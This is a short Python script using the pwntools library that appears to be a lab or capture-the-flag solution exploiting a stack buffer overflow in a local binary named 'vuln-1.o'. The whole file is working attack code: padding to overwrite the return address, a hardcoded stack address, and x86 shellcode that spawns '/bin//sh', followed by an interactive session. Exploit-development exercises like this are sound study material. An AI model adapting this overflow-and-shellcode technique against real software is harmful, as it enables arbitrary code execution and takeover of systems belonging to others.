#!/usr/bin/env python3

from pwn import *

padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"

buf_ptr = 0xffffd1b0

eip = buf_ptr + len(padding) + 4

shellcode = """ 
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
 """

send = padding + p32(eip) + asm(shellcode)

p = process('./vuln-1.o')

p.sendline(send)
p.interactive()
